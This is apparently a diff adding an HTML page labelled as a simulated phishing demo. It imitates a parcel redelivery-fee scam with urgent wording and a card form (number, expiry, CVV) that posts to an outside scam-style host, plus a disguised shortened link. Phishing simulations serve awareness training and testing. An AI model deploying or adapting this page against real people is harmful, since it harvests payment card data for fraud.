@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Express Parcel Delivery - Redelivery Fee Required (Simulated Phishing Demo)</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #F8F9FA;
+      margin: 0;
+      padding: 40px 20px;
+    }
+    .demo-notice {
+      max-width: 500px;
+      margin: 0 auto 20px;
+      padding: 10px;
+      background: #FFF3CD;
+      border: 1px solid #FFEEBA;
+      border-radius: 6px;
+      color: #856404;
+      font-size: 13px;
+      text-align: center;
+    }
+    .card {
+      max-width: 480px;
+      margin: 0 auto;
+      background: #FFF;
+      border: 1px solid #E5E7EB;
+      border-radius: 8px;
+      padding: 28px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+    }
+    .badge {
+      display: inline-block;
+      background: #EF4444;
+      color: #FFF;
+      padding: 4px 10px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: bold;
+      margin-bottom: 12px;
+    }
+    h1 {
+      font-size: 20px;
+      margin: 0 0 12px 0;
+      color: #111827;
+    }
+    p {
+      font-size: 14px;
+      color: #4B5563;
+      line-height: 1.5;
+    }
+    .fee-box {
+      background: #FEF2F2;
+      border: 1px dashed #EF4444;
+      border-radius: 6px;
+      padding: 14px;
+      margin: 16px 0;
+      text-align: center;
+    }
+    .fee-amount {
+      font-size: 24px;
+      font-weight: bold;
+      color: #DC2626;
+    }
+    .form-group {
+      margin-bottom: 14px;
+    }
+    label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      margin-bottom: 4px;
+      color: #374151;
+    }
+    input {
+      width: 100%;
+      padding: 9px;
+      border: 1px solid #D1D5DB;
+      border-radius: 4px;
+      box-sizing: border-box;
+      font-size: 13px;
+    }
+    .row {
+      display: flex;
+      gap: 12px;
+    }
+    .btn-pay {
+      width: 100%;
+      background: #DC2626;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 4px;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .help-link {
+      display: block;
+      text-align: center;
+      margin-top: 16px;
+      font-size: 12px;
+      color: #2563EB;
+    }
+  </style>
+</head>
+<body>
+  <div class="demo-notice">
+    <strong>SIMULATION PAGE FOR TESTING:</strong> Demonstrates delivery fee scam pretext, time pressure (within 24 hours), and credit card payment harvesting.
+  </div>
+
+  <div class="card">
+    <span class="badge">ACTION REQUIRED</span>
+    <h1>Package Delivery Pending: Unpaid Customs Fee</h1>
+    <p>
+      Your parcel (Tracking #US-9842109-EX) cannot be delivered due to an unpaid shipping and customs fee. You have <strong>within 24 hours to verify</strong> and pay the balance before the package is returned to sender.
+    </p>
+
+    <div class="fee-box">
+      <div>Outstanding Balance</div>
+      <div class="fee-amount">$2.95 USD</div>
+    </div>
+
+    <!-- Credit card harvesting form -->
+    <form action="http://urgent-delivery-pay.top/process" method="POST">
+      <div class="form-group">
+        <label for="cardholder">Cardholder Full Name</label>
+        <input type="text" id="cardholder" name="cardholder" placeholder="John Doe" required>
+      </div>
+
+      <div class="form-group">
+        <label for="cardNumber">Credit Card Number</label>
+        <input type="text" id="cardNumber" name="cardNumber" placeholder="4111 2222 3333 4444" autocomplete="cc-number" required>
+      </div>
+
+      <div class="row">
+        <div class="form-group" style="flex: 1;">
+          <label for="exp">Expiry Date</label>
+          <input type="text" id="exp" name="exp" placeholder="MM/YY" required>
+        </div>
+        <div class="form-group" style="flex: 1;">
+          <label for="cvv">Security Code (CVV)</label>
+          <input type="text" id="cvv" name="cvv" placeholder="123" required>
+        </div>
+      </div>
+
+      <button type="submit" class="btn-pay">Pay $2.95 & Release Package</button>
+    </form>
+
+    <!-- Shortened tracking link -->
+    <a href="https://bit.ly/fake-postal-tracking" class="help-link">Track package via carrier update portal</a>
+  </div>
+</body>
+</html>
